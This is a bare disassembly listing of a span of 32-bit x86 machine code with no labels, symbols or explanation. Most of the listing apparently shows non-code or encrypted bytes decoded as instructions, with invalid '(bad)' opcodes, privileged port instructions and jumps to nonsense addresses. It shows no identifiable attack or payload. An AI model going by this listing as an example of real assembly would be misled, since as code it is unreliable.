  40b076:	ror    DWORD PTR [ebp+0x23e54d5e],1
  40b07c:	in     al,dx
  40b07d:	adc    al,0xd
  40b07f:	mov    WORD PTR [eax],fs
  40b081:	xor    eax,0x9d93263
  40b086:	clc    
  40b087:	loopne 0x40b059
  40b089:	aas    
  40b08a:	add    dl,BYTE PTR [ebp+0x35ba0571]
  40b090:	popf   
  40b091:	mov    eax,0x9204a99c
  40b096:	jo     0x40b07e
  40b098:	icebp  
  40b099:	fwait
  40b09a:	mov    al,0x5
  40b09c:	aad    0x59
  40b09e:	dec    esi
  40b09f:	or     al,0xff
  40b0a1:	push   edx
  40b0a2:	outs   dx,BYTE PTR ds:[esi]
  40b0a3:	imul   ebx,eax,0xffffffbe
  40b0a6:	pop    ebp
  40b0a7:	ror    ch,1
  40b0a9:	inc    esi
  40b0aa:	sahf   
  40b0ab:	sbb    DWORD PTR [esp+ebx*2-0x15bde98b],0x42
  40b0b3:	pop    es
  40b0b4:	jo     0x40b0c8
  40b0b6:	inc    edx
  40b0b7:	or     eax,0x80cd71a7
  40b0bc:	sar    DWORD PTR [edi-0x42fecade],0xf4
  40b0c3:	xor    al,0xe4
  40b0c5:	ja     0x40b0b8
  40b0c7:	mov    al,ds:0x579919bd
  40b0cc:	add    BYTE PTR [edx+0x5c],dh
  40b0cf:	(bad)  
  40b0d0:	fld    DWORD PTR ds:0x9835e6e7
  40b0d6:	icebp  
  40b0d7:	adc    al,0x6
  40b0d9:	stos   DWORD PTR es:[edi],eax
  40b0da:	int    0x12
  40b0dc:	mov    ch,0x89
  40b0de:	fsub   st,st(1)
  40b0e0:	repnz dec esi
  40b0e2:	adc    cl,BYTE PTR [edx]
  40b0e4:	sub    DWORD PTR [edi-0x56924952],edi
  40b0ea:	mov    esp,DWORD PTR [edi+esi*1-0x34]
  40b0ee:	push   edi
  40b0ef:	sub    BYTE PTR [bx],bl
  40b0f2:	cdq    
  40b0f3:	daa    
  40b0f4:	and    esp,DWORD PTR [edi]
  40b0f6:	xor    BYTE PTR [eax+0x38ca6058],bh
  40b0fc:	push   esp
  40b0fd:	imul   ecx,edi,0x5ffc7984
  40b103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b104:	push   ebx
  40b105:	or     edx,DWORD PTR [edi-0x27]
  40b108:	and    ebx,edx
  40b10a:	jge    0x40b0ea
  40b10c:	mov    bl,BYTE PTR [edi+0x68]
  40b10f:	push   esi
  40b110:	(bad)  
  40b111:	icebp  
  40b112:	mov    BYTE PTR [esi-0x1e2e2d82],bh
  40b118:	mov    ebp,DWORD PTR [eax]
  40b11a:	scas   eax,DWORD PTR es:[edi]
  40b11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b11c:	xor    BYTE PTR [esi],0xee
  40b11f:	imul   eax,edx,0x58
  40b122:	pop    ds
  40b123:	retf   0xacfb
  40b126:	int    0x56
  40b128:	mov    dh,0x33
  40b12a:	mov    esp,eax
  40b12c:	(bad)  
  40b12d:	xchg   ecx,eax
  40b12e:	xchg   ebp,eax
  40b12f:	in     eax,0x36
  40b131:	pop    edi
  40b132:	dec    DWORD PTR [ebx+esi*8-0x13]
  40b136:	js     0x40b17c
  40b138:	mov    fs,WORD PTR [eax+0x140cd390]
  40b13e:	xchg   esi,eax
  40b13f:	lea    edi,[edi]
  40b141:	xor    DWORD PTR [ebx-0x763a0de3],0xffffffd7
  40b148:	fild   QWORD PTR [esi+0x6c]
  40b14b:	push   cs
  40b14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b14d:	jecxz  0x40b169
  40b14f:	test   BYTE PTR [ebx-0x9aa6b31],0x8
  40b156:	pop    ebp
  40b157:	inc    ebp
  40b158:	adc    BYTE PTR [ecx+ebp*1],0xcc
  40b15c:	and    DWORD PTR [esi-0x5edf55b0],0xffffff8a
  40b163:	aas    
  40b164:	bound  eax,QWORD PTR [eax+0x22a0f6f8]
  40b16a:	int    0x8c
  40b16c:	in     al,0xa8
  40b16e:	dec    esp
  40b16f:	fwait
  40b170:	inc    esp
  40b171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b172:	sub    DWORD PTR [eax+ecx*8+0x2ead943a],ebp
  40b179:	mov    esp,0xeb492ed8
  40b17e:	push   ss
  40b17f:	jecxz  0x40b170
  40b181:	mov    ah,0xb2
  40b183:	icebp  
  40b184:	ja     0x40b1b3
  40b186:	and    eax,0x14a2dba4
  40b18b:	fs scas eax,DWORD PTR es:[edi]
  40b18d:	lods   eax,DWORD PTR ds:[esi]
  40b18e:	adc    dl,ah
  40b190:	or     DWORD PTR [esi+0x72],0xa54d7f44
  40b197:	push   esp
  40b198:	cmp    DWORD PTR [eax],eax
  40b19a:	and    al,0x4a
  40b19c:	lock add BYTE PTR [edx+0x7161f67a],0x68
  40b1a4:	data16 add BYTE PTR [ebx],ch
  40b1a7:	shl    DWORD PTR [ecx-0x65a6fa66],cl
  40b1ad:	jge    0x40b1e5
  40b1af:	bnd jno 0x40b228
  40b1b2:	lock rcr DWORD PTR [esi+ebx*1-0x6dc1fc89],cl
  40b1ba:	sub    eax,0x5b75417c
  40b1bf:	out    0xa3,al
  40b1c1:	outs   dx,DWORD PTR ds:[esi]
  40b1c2:	push   esp
  40b1c3:	fidiv  DWORD PTR [edi]
  40b1c5:	jbe    0x40b23e
  40b1c7:	iret   
  40b1c8:	jl     0x40b1bc
  40b1ca:	jle    0x40b1ef
  40b1cc:	mov    WORD PTR [ebx+0x39],ss
  40b1cf:	xchg   esp,eax
  40b1d0:	xor    DWORD PTR [ebx-0x155acc2a],0xe
  40b1d7:	mov    WORD PTR [ecx-0x72],?
  40b1da:	pcmpeqd mm4,QWORD PTR [esi-0x592f051]
  40b1e1:	or     DWORD PTR ds:0x40f1cc66,edi
  40b1e7:	pop    ds
  40b1e8:	dec    edx
  40b1e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1ea:	call   esp
  40b1ec:	mov    WORD PTR [edx],fs
  40b1ee:	xor    al,bh
  40b1f0:	sbb    dh,bh
  40b1f2:	pop    ds
  40b1f3:	(bad)  
  40b1f4:	cwde   
  40b1f5:	or     dl,BYTE PTR ds:[ebx-0x39]
  40b1f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1fa:	fcomp  QWORD PTR [ebx-0x46]
  40b1fd:	xor    al,0x9d
  40b1ff:	jo     0x40b1f8
  40b201:	sbb    edx,DWORD PTR [eax]
  40b203:	mov    esp,0x14bf5866
  40b208:	mov    BYTE PTR [ebx-0x1e],dl
  40b20b:	daa    
  40b20c:	cmp    cl,BYTE PTR [ebx+0x7ad19f14]
  40b212:	mov    esp,DWORD PTR [edi-0x67dc3945]
  40b218:	jne    0x40b1af
  40b21a:	push   ss
  40b21b:	ficom  WORD PTR [esi-0x1b]
  40b21e:	repnz cmp al,0x50
  40b221:	add    al,0xdf
  40b223:	or     eax,0xf3aada4b
  40b228:	ffree  st(2)
  40b22a:	mov    eax,ds:0x77df8898
  40b22f:	mov    dh,0xd4
  40b231:	or     ah,BYTE PTR [edx]
  40b233:	fiadd  DWORD PTR [ebp-0x693b87e3]
  40b239:	pop    esi
  40b23a:	cmp    eax,0x1332e794
  40b23f:	repz iret 
  40b241:	inc    edi
  40b242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b243:	lds    eax,FWORD PTR [edi-0x40e00963]
  40b249:	popf   
  40b24a:	stc    
  40b24b:	add    DWORD PTR ds:0x2c0e2774,edi
  40b251:	adc    edi,0x6d
  40b254:	adc    edx,DWORD PTR [eax+0x41]
  40b257:	push   edx
  40b258:	scas   eax,DWORD PTR es:[edi]
  40b259:	mov    ecx,gs
  40b25b:	or     dh,ah
  40b25d:	pop    ds
  40b25e:	cmp    edi,DWORD PTR [edi]
  40b260:	push   eax
  40b261:	in     eax,dx
  40b262:	int3   
  40b263:	cmp    dh,BYTE PTR [esp+esi*1]
  40b266:	imul   esi
  40b268:	outs   dx,DWORD PTR ds:[esi]
  40b269:	imul   BYTE PTR [esi+0x30c43ef2]
  40b26f:	fbstp  TBYTE PTR [bx]
  40b272:	fadd   DWORD PTR [ecx+ebx*2]
  40b275:	in     al,0xf8
  40b277:	sar    bh,1
  40b279:	xchg   ecx,eax
  40b27a:	inc    edx
  40b27b:	adc    ebp,DWORD PTR [eax+esi*1-0x7bdcf449]
  40b282:	xor    eax,0x63d3470f
  40b287:	mov    esi,0xd72d95cb
  40b28c:	stos   BYTE PTR es:[edi],al
  40b28d:	lea    edi,[ebx+0x6009fa15]
  40b293:	xchg   DWORD PTR [edx],eax
  40b295:	mov    bl,0xf5
  40b297:	arpl   cx,sp
  40b299:	outs   dx,BYTE PTR ds:[esi]
  40b29a:	stos   BYTE PTR es:[edi],al
  40b29b:	jbe    0x40b2af
  40b29d:	jne    0x40b26a
  40b29f:	pop    esp
  40b2a0:	jne    0x40b2be
  40b2a2:	sub    ah,BYTE PTR [ebx+0x6c]
  40b2a5:	or     DWORD PTR [ebx+0x7170fa8f],ebp
  40b2ab:	xchg   ebx,eax
  40b2ac:	in     eax,0x6b
  40b2ae:	pop    ss
  40b2af:	es inc esi
  40b2b1:	loop   0x40b2d6
  40b2b3:	or     bh,BYTE PTR [eax-0x18]
  40b2b6:	or     eax,0x3d798bf8
  40b2bb:	jbe    0x40b337
  40b2bd:	xchg   edx,eax
  40b2be:	sub    cl,0x14
  40b2c1:	add    eax,DWORD PTR [eax]
  40b2c3:	add    dl,dl
  40b2c5:	rol    ah,0xc9
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0xb3fbb132
  40b2d2:	out    0x62,al
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	mov    ecx,ecx
  40b2de:	lahf   
  40b2df:	xchg   edx,eax
  40b2e0:	and    DWORD PTR [ebp+0x4a],edi
  40b2e3:	outs   dx,BYTE PTR ds:[esi]
  40b2e4:	mov    ebx,0x758ba637
  40b2e9:	xchg   edi,eax
  40b2ea:	sub    ecx,edx
  40b2ec:	sbb    al,0x67
  40b2ee:	in     al,dx
  40b2ef:	fild   DWORD PTR [esi+0x39]
  40b2f2:	jb     0x40b2cf
  40b2f4:	mov    BYTE PTR [ecx+0x28b076ad],cl
  40b2fa:	lock loope 0x40b36a
  40b2fd:	mov    esp,DWORD PTR [edi-0x37b6082d]
  40b303:	sbb    BYTE PTR [edi+eax*8],bl
  40b306:	loopne 0x40b31d
  40b308:	imul   BYTE PTR [ebx-0x74e81454]
  40b30e:	mov    bl,0xe3
  40b310:	and    ecx,DWORD PTR [edi]
  40b312:	push   esp
  40b313:	and    cl,BYTE PTR [esi]
  40b315:	pop    ebp
  40b316:	adc    al,0x6f
  40b318:	nop
  40b319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b31a:	mov    eax,ds:0x61dce761
  40b31f:	jns    0x40b2d1
  40b321:	fadd   QWORD PTR [ebp+ecx*1-0x40dcb7b4]
  40b328:	jae    0x40b2c5
  40b32a:	hlt    
  40b32b:	adc    esp,DWORD PTR [ebp-0x12]
  40b32e:	(bad)  
  40b32f:	adc    edi,esi
  40b331:	mov    DWORD PTR [edx-0x4cedd83],eax
  40b337:	es or  al,0x7e
  40b33a:	push   0xfcc92377
  40b33f:	pushf  
  40b340:	or     DWORD PTR [edi+0x3ddbd220],esp
  40b346:	sub    dl,ch
  40b348:	jp     0x40b33c
  40b34a:	hlt    
  40b34b:	(bad)  
  40b34c:	xchg   edx,eax
  40b34d:	add    BYTE PTR [eax],dl
  40b34f:	jecxz  0x40b379
  40b351:	xor    eax,0xf6af6b87
  40b356:	mov    eax,0xfefab749
  40b35b:	push   edx
  40b35d:	ja     0x40b31f
  40b35f:	int3   
  40b360:	scas   al,BYTE PTR es:[edi]
  40b361:	clc    
  40b362:	das    
  40b363:	fldcw  WORD PTR [eax+eiz*1]
  40b366:	(bad)  
  40b367:	aad    0x2f
  40b369:	pop    ss
  40b36a:	pop    esp
  40b36b:	push   ecx
  40b36c:	pop    eax
  40b36d:	jnp    0x40b37c
  40b36f:	rcr    BYTE PTR [edx-0x11],cl
  40b372:	pop    es
  40b373:	jge    0x40b329
  40b375:	ds xchg esp,eax
  40b377:	std    
  40b378:	cmp    esp,DWORD PTR [ebp-0x35]
  40b37b:	int    0x31
  40b37d:	sbb    eax,DWORD PTR [esi-0x396488a7]
  40b383:	sar    DWORD PTR [ebx],cl
  40b385:	dec    ecx
  40b386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b387:	pop    ebx
  40b388:	mov    ah,0xc3
  40b38a:	inc    ebp
  40b38b:	and    bl,BYTE PTR [ecx+edi*4-0x2b]
  40b38f:	es jp  0x40b359
  40b392:	mov    dh,0x47
  40b394:	xor    cl,BYTE PTR [esi-0x21]
  40b397:	xchg   DWORD PTR [ebp-0x62],ebx
  40b39a:	cli    
  40b39b:	call   0x575e8025
  40b3a0:	sub    ch,BYTE PTR [eax]
  40b3a2:	jle    0x40b420
  40b3a4:	ret    0xfadd
  40b3a7:	cli    
  40b3a8:	hlt    
  40b3a9:	in     al,dx
  40b3aa:	je     0x40b3d1
  40b3ac:	pushf  
  40b3ad:	fisttp WORD PTR [ecx+eax*1]
  40b3b0:	mov    DWORD PTR [esi-0x27],eax
  40b3b3:	cli    
  40b3b4:	push   0xffffffe3
  40b3b6:	es sti 
  40b3b8:	ret    
  40b3b9:	jns    0x40b35c
  40b3bb:	lahf   
  40b3bc:	leave  
  40b3bd:	ins    BYTE PTR es:[edi],dx
  40b3be:	test   al,0xcd
  40b3c0:	add    al,0xd1
  40b3c2:	in     al,dx
  40b3c3:	das    
  40b3c4:	or     bl,ch
  40b3c6:	cmp    al,BYTE PTR [ebx-0x7aff66da]
  40b3cc:	or     ch,BYTE PTR [esi]
  40b3ce:	add    ebp,ebp
  40b3d0:	mov    DWORD PTR gs:[edi+0x68],ecx
  40b3d4:	in     eax,dx
  40b3d5:	aam    0x99
  40b3d7:	test   BYTE PTR [ebx-0x1f8566b5],cl
  40b3dd:	or     al,0xb9
  40b3df:	int3   
  40b3e0:	or     BYTE PTR [edi+0x3b],ch
  40b3e3:	and    al,0x3b
  40b3e5:	retf   
  40b3e6:	xor    DWORD PTR [ebx],ecx
  40b3e8:	dec    esp
  40b3e9:	mov    WORD PTR [eax-0x5b51f0a2],cx
  40b3f0:	in     al,dx
  40b3f1:	retf   
  40b3f2:	(bad)  
  40b3f3:	outs   dx,DWORD PTR ds:[esi]
  40b3f4:	repnz loope 0x40b463
  40b3f7:	out    dx,eax
  40b3f8:	in     al,dx
  40b3f9:	sbb    eax,0x220bad1e
  40b3fe:	or     ebp,ebp
  40b400:	jecxz  0x40b452
  40b402:	push   eax
  40b403:	push   edi
  40b404:	retf   
  40b405:	xchg   edi,eax
  40b406:	sbb    ch,bl
  40b408:	clc    
  40b409:	iret   
  40b40a:	call   0x9d73:0x1c7bac82
  40b411:	xchg   ecx,eax
  40b412:	xor    DWORD PTR [esi],0xb8e1c311
  40b418:	mov    ds:0x81819737,al
  40b41d:	jns    0x40b451
  40b41f:	mov    al,0x45
  40b421:	out    dx,al
  40b422:	lgdtd  [edi-0x75]
  40b426:	enter  0xc014,0x97
  40b42a:	mov    DWORD PTR [edi+edi*2-0x79],ebp
  40b42e:	sub    al,0xfc
  40b430:	xor    edi,DWORD PTR [eax+edx*1+0x2a5b0ab4]
  40b437:	push   ss
  40b438:	sbb    DWORD PTR [ebp-0x6a3d25ef],ebp
  40b43e:	xor    esp,DWORD PTR [eax-0x50]
  40b441:	out    0xa3,eax
  40b443:	loope  0x40b3e5
  40b445:	cmp    al,0xb7
  40b447:	icebp  
  40b448:	fistp  DWORD PTR [ecx]
  40b44a:	fisubr DWORD PTR [esi+0x5541762]
  40b450:	cs out dx,al
  40b452:	(bad)  
  40b453:	div    DWORD PTR [ebx]
  40b455:	aas    
  40b456:	pushf  
  40b457:	sub    DWORD PTR ss:[edx],esi
  40b45a:	out    0x57,al
  40b45c:	xchg   ebp,eax
  40b45d:	loope  0x40b3ed
  40b45f:	xchg   edx,eax
  40b460:	and    ebp,edx
  40b462:	out    0xbd,al
  40b464:	jle    0x40b441
  40b466:	ja     0x40b404
  40b468:	mov    bh,0xff
  40b46a:	xchg   ebp,eax
  40b46b:	out    0x1a,eax
  40b46d:	xor    BYTE PTR [esi-0x40],cl
  40b470:	xor    BYTE PTR [ebp-0x45],0x59
  40b474:	inc    esp
  40b475:	cs pop ss
  40b477:	jmp    0x689b:0x84c5c0e
  40b47e:	cmc    
  40b47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b480:	out    0xa7,eax
  40b482:	(bad)  
  40b483:	shr    BYTE PTR [edi+0x11],cl
  40b486:	push   edx
  40b487:	xchg   ebx,eax
  40b488:	mov    eax,ds:0x95a8bf5b
  40b48d:	test   al,0xba
  40b48f:	mov    eax,0xc73713e0
  40b494:	and    DWORD PTR [ebp+0x46],esi
  40b497:	mov    ds:0x36548d6f,eax
  40b49c:	cmp    eax,0x64b97b32
  40b4a1:	mov    ebx,0x5ad043a6
  40b4a6:	pop    esi
  40b4a7:	repnz outs dx,DWORD PTR ds:[esi]
  40b4a9:	aas    
  40b4aa:	sbb    al,0x3a
  40b4ac:	lahf   
  40b4ad:	sbb    BYTE PTR ds:0xbf2e1610,ah
  40b4b3:	dec    ebx
  40b4b4:	push   ebx
  40b4b5:	xchg   ebp,eax
  40b4b6:	inc    ebp
  40b4b7:	push   es
  40b4b8:	push   es
  40b4b9:	push   0xc
  40b4bb:	push   0x3715f6bd
  40b4c0:	repz mov ecx,0x828bd3b8
  40b4c6:	dec    ebp
  40b4c7:	clc    
  40b4c8:	inc    eax
  40b4c9:	push   ebp
  40b4ca:	sub    ebp,DWORD PTR [edi]
  40b4cc:	test   al,0xba
  40b4ce:	inc    BYTE PTR [ecx+0x387ddea8]
  40b4d4:	test   eax,0x40d7aab3
  40b4d9:	loope  0x40b4a8
  40b4db:	(bad)  
  40b4dc:	fsubr  QWORD PTR [ebp-0x79243d98]
  40b4e2:	adc    ecx,edi
  40b4e4:	outs   dx,BYTE PTR ds:[esi]
  40b4e5:	arpl   bp,sp
  40b4e7:	mov    ah,0xa1
  40b4e9:	or     edi,DWORD PTR [ebx-0x4dbf7807]
  40b4ef:	xlat   BYTE PTR ds:[ebx]
  40b4f0:	ja     0x40b527
  40b4f2:	dec    eax
  40b4f3:	and    eax,0xce60bc17
  40b4f8:	xor    al,0xa
  40b4fa:	std    
  40b4fb:	xchg   ecx,eax
  40b4fc:	sbb    eax,0x6e2274ed
  40b501:	push   si
  40b503:	(bad)  
  40b504:	ss mov ah,0xd5
  40b507:	dec    edx
  40b508:	aaa    
  40b509:	cmp    edi,DWORD PTR [esi]
  40b50b:	fild   WORD PTR [ebx+ebx*2]
  40b50e:	xchg   ebp,eax
  40b50f:	pop    ebp
  40b510:	lahf   
  40b511:	in     eax,0x20
  40b513:	fisubr WORD PTR [ebx+0x4fe41162]
  40b519:	sub    eax,0x4c04913e
  40b51e:	popf   
  40b51f:	mul    BYTE PTR [ebp+0x2acb15c8]
  40b525:	addr16 pop es
  40b527:	in     al,0x5d
  40b529:	ret    
  40b52a:	retf   
  40b52b:	out    0x72,eax
  40b52d:	push   edi
  40b52e:	(bad)  
  40b530:	aad    0x76
  40b532:	out    0xff,al
  40b534:	in     eax,dx
  40b535:	inc    ebp
  40b536:	int3   
  40b537:	fwait
  40b538:	adc    bl,ch
  40b53a:	cmp    al,0x16
  40b53c:	call   ebx
  40b53e:	push   0x1f1802c3
  40b543:	shr    esi,0xda
  40b546:	js     0x40b50d
  40b548:	inc    esi
  40b549:	lahf   
  40b54a:	fs pop eax
  40b54c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40b54e:	sub    al,0x51
  40b550:	shr    DWORD PTR [ebx],cl
  40b552:	xchg   BYTE PTR [esi-0x90e76fb],cl
  40b558:	test   al,0x48
  40b55a:	leave  
  40b55b:	nop
  40b55c:	cmp    al,0x54
  40b55e:	jns    0x40b585
  40b560:	pop    esi
  40b561:	(bad)  
  40b562:	lods   al,BYTE PTR ds:[esi]
  40b563:	dec    edi
  40b564:	aad    0x73
  40b566:	repz jnp 0x40b5bc
  40b569:	cmp    ebx,DWORD PTR [esi]
  40b56b:	push   0xffffffa9
  40b56d:	jns    0x40b56d
  40b56f:	xchg   BYTE PTR [edi],ch
  40b571:	dec    ecx
  40b572:	or     BYTE PTR [esi+0xc],bh
  40b575:	call   0x8c40:0x385dd173
  40b57c:	cdq    
  40b57d:	sar    edx,0xf4
  40b580:	lea    ebp,[esi]
  40b582:	adc    ebx,DWORD PTR [eax]
  40b584:	push   cs
  40b585:	cld    
  40b586:	xchg   ebp,eax
  40b587:	jbe    0x40b5d5
  40b589:	xchg   esi,eax
  40b58a:	add    al,0x33
  40b58c:	jmp    0xa7a1:0xb1d62182
  40b593:	rol    BYTE PTR [edx+eax*4-0x5a],0xa3
  40b598:	xchg   edx,eax
  40b599:	push   ecx
  40b59a:	(bad)  
  40b59b:	mov    ?,WORD PTR [esi+ebx*1-0x7c]
  40b59f:	lods   al,BYTE PTR ds:[esi]
  40b5a0:	imul   esi,DWORD PTR [eax+0x68079326],0xba659af9
  40b5aa:	out    0xba,al
  40b5ac:	cmp    esp,DWORD PTR [ecx-0x233d31a0]
  40b5b2:	dec    edx
  40b5b3:	dec    esp
  40b5b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5b5:	sti    
  40b5b6:	push   ecx
  40b5b7:	and    eax,0xbb607bf
  40b5bc:	popa   
  40b5bd:	mov    bh,0xe8
  40b5bf:	clc    
  40b5c0:	xchg   edi,eax
  40b5c1:	xor    ax,WORD PTR ds:0xdf9fdd81
  40b5c8:	jl     0x40b638
  40b5ca:	daa    
  40b5cb:	fwait
  40b5cc:	inc    ecx
  40b5cd:	loopne 0x40b594
  40b5cf:	xlat   BYTE PTR ds:[ebx]
  40b5d0:	pop    edi
  40b5d1:	jge    0x40b5ab
  40b5d3:	push   esp
  40b5d4:	or     eax,0xf3ea89c
  40b5d9:	test   BYTE PTR [edi],dl
  40b5db:	add    BYTE PTR [eax],al
  40b5dd:	add    BYTE PTR [ebx+0x881e445],cl
  40b5e3:	popf   
  40b5e4:	sbb    al,0x75
  40b5e6:	pusha  
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0x75ccd584]
  40b60d:	ins    BYTE PTR es:[edi],dx
  40b60e:	das    
  40b60f:	(bad)  
  40b610:	retf   0x788f
  40b613:	js     0x40b689
  40b615:	jle    0x40b68f
  40b617:	js     0x40b63a
  40b619:	pop    ebp
  40b61a:	or     esp,ebp
  40b61c:	fcomp  DWORD PTR [ebx-0x31]
  40b61f:	xor    dh,BYTE PTR [edi]
  40b621:	ins    DWORD PTR es:[edi],dx
  40b622:	push   cs
  40b623:	jmp    0x7575:0x33ad512d
  40b62a:	push   cs
  40b62b:	sub    DWORD PTR [edi],eax
  40b62d:	mov    ah,0x9e
  40b62f:	xchg   BYTE PTR [edx-0x2896623a],ch
  40b635:	adc    bl,0x25
  40b638:	jb     0x40b619
  40b63a:	xchg   BYTE PTR [ecx+0xb4edddb],dl
  40b640:	push   ds
  40b641:	jge    0x40b626
  40b643:	mov    bl,0x1b
  40b645:	mov    dl,0x96
  40b647:	pop    ss
  40b648:	inc    edi
  40b649:	jae    0x40b653
  40b64b:	push   edx
  40b64c:	jb     0x40b648
  40b64e:	cmp    bl,BYTE PTR [eax+eax*1]
  40b651:	jmp    0xdca9:0xa9a6c2b8
  40b658:	jle    0x40b63d
  40b65a:	ret    0x2084
  40b65d:	cs call 0x5ea52ae4
  40b663:	sub    DWORD PTR [edx+0x1c],0xffffff84
  40b667:	jno    0x40b6a5
  40b669:	sbb    eax,0xcfa19500
  40b66e:	sub    ecx,edi
  40b670:	or     ecx,DWORD PTR [ebx+0xc]
  40b673:	mov    ds:0x783c894,eax
  40b678:	and    BYTE PTR [esi-0x2ffa01db],bl
  40b67e:	mov    ah,0x19
  40b680:	scas   eax,DWORD PTR es:[edi]
  40b681:	shr    BYTE PTR [esp+ebp*2+0x38e293de],cl
  40b688:	xchg   edi,eax
  40b689:	inc    ecx
  40b68a:	sub    ch,ah
  40b68c:	aam    0x20
  40b68e:	dec    ebx
  40b690:	push   ebx
  40b691:	jbe    0x40b692
  40b693:	push   eax
  40b694:	jo     0x40b6d5
  40b696:	int    0x88
  40b698:	and    BYTE PTR [esi-0xe89a2d],ch
  40b69e:	outs   dx,DWORD PTR ds:[esi]
  40b69f:	shl    DWORD PTR [esi+0x42],cl
  40b6a2:	and    DWORD PTR [edx-0x5ed1fe25],eax
  40b6a8:	sahf   
  40b6a9:	hlt    
  40b6aa:	and    ecx,DWORD PTR [ebp-0x22]
  40b6ad:	mov    bl,0x5
  40b6af:	in     al,dx
  40b6b0:	jge    0x40b689
  40b6b2:	dec    ebx
  40b6b3:	jp     0x40b698
  40b6b5:	jp     0x40b700
  40b6b7:	fdivr  QWORD PTR [ebx+0x1c]
  40b6ba:	bnd ss repz repz ret 
  40b6bf:	fstp   st(7)
  40b6c1:	xchg   ecx,eax
  40b6c2:	(bad)  
  40b6c3:	xor    bl,al
  40b6c5:	pop    edi
  40b6c6:	mov    DWORD PTR [ebx-0x67],edi
  40b6c9:	mov    ds:0xfb9acc6a,eax
  40b6ce:	dec    edi
  40b6cf:	adc    edi,DWORD PTR [eax+eax*1]
  40b6d2:	outs   dx,BYTE PTR ds:[esi]
  40b6d3:	aad    0x2c
  40b6d5:	push   ecx
  40b6d6:	xor    al,0xe3
  40b6d8:	or     BYTE PTR [ebp+0x7c],ah
  40b6db:	jle    0x40b6bb
  40b6dd:	pop    ss
  40b6de:	xchg   edi,eax
  40b6df:	xchg   esp,eax
  40b6e0:	dec    edi
  40b6e1:	jmp    0x65849b77
  40b6e6:	ss push cs
  40b6e8:	mov    eax,gs
  40b6ea:	inc    esp
  40b6eb:	stos   DWORD PTR es:[edi],eax
  40b6ec:	jo     0x40b675
  40b6ee:	mov    ebp,0x28baf0b6
  40b6f3:	call   FWORD PTR [esi-0x4f9082c7]
  40b6f9:	ret    
  40b6fa:	jecxz  0x40b75b
  40b6fc:	out    0xec,eax
  40b6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ff:	loop   0x40b761
  40b701:	pushf  
  40b702:	add    BYTE PTR [esi+0x787c895f],bh
  40b708:	mov    ds:0xc823b654,eax
  40b70d:	ja     0x40b76b
  40b70f:	mov    bl,0x7e
  40b711:	bound  edx,QWORD PTR [ecx]
  40b713:	call   0xc7afe7bb
  40b718:	mov    WORD PTR [ecx+0x14251630],ss
  40b71e:	bound  ecx,QWORD PTR [esi-0x75]
  40b721:	mov    ds:0x1e08e945,al
  40b726:	fimul  DWORD PTR [ebx-0x1389c87d]
  40b72c:	jle    0x40b6d4
  40b72e:	cs pop eax
  40b730:	xlat   BYTE PTR ds:[ebx]
  40b731:	ss into 
  40b733:	test   eax,0x6e04a52b
  40b738:	(bad)  
  40b739:	clc    
  40b73a:	ss hlt 
  40b73c:	stos   DWORD PTR es:[edi],eax
  40b73d:	sbb    eax,0xbb68a4f6
  40b742:	sub    esi,DWORD PTR [ebx]
  40b744:	xor    BYTE PTR [ecx+0xb],dl
  40b747:	(bad)  
  40b748:	fsubr  st,st(2)
  40b74a:	jb     0x40b752
  40b74c:	fld    QWORD PTR [ebx+0x30]
  40b74f:	(bad)  
  40b750:	repnz in al,0xf
  40b753:	adc    eax,0x94ffea06
  40b758:	test   BYTE PTR [ecx],dh
  40b75a:	mov    al,ds:0x675c3827
  40b75f:	mov    esi,0xbc1fa403
  40b764:	popa   
  40b765:	retf   0xae5
  40b768:	add    DWORD PTR [edi+0x6f],edi
  40b76b:	scas   al,BYTE PTR es:[edi]
  40b76c:	inc    esi
  40b76d:	cdq    
  40b76e:	sbb    al,0x7b
  40b770:	les    esi,FWORD PTR [eax-0x24]
  40b773:	dec    eax
  40b774:	aam    0x58
  40b776:	jge    0x40b7e1
  40b778:	jno    0x40b7c4
  40b77a:	lock sahf 
  40b77c:	cmp    al,0xab
  40b77e:	adc    edi,DWORD PTR [ecx-0x11]
  40b781:	div    BYTE PTR [eax]
  40b783:	xchg   ebp,eax
  40b784:	pop    esp
  40b785:	out    0x4e,al
  40b787:	cmp    eax,0x6a74aca0
  40b78c:	sub    al,0xed
  40b78e:	retf   0x8fe8
  40b791:	push   edx
  40b792:	and    ecx,DWORD PTR [ecx+0x3c]
  40b795:	mov    ds:0xdf1347f3,eax
  40b79a:	std    
  40b79b:	push   ecx
  40b79c:	xchg   edi,eax
  40b79d:	mov    dh,0x7b
  40b79f:	repz jne 0x40b805
  40b7a2:	dec    esp
  40b7a3:	dec    esi
  40b7a4:	enter  0x2b34,0x7a
  40b7a8:	sbb    al,0x64
  40b7aa:	retf   0xda1d
  40b7ad:	cs mov esp,0x30bfd642
  40b7b3:	dec    edx
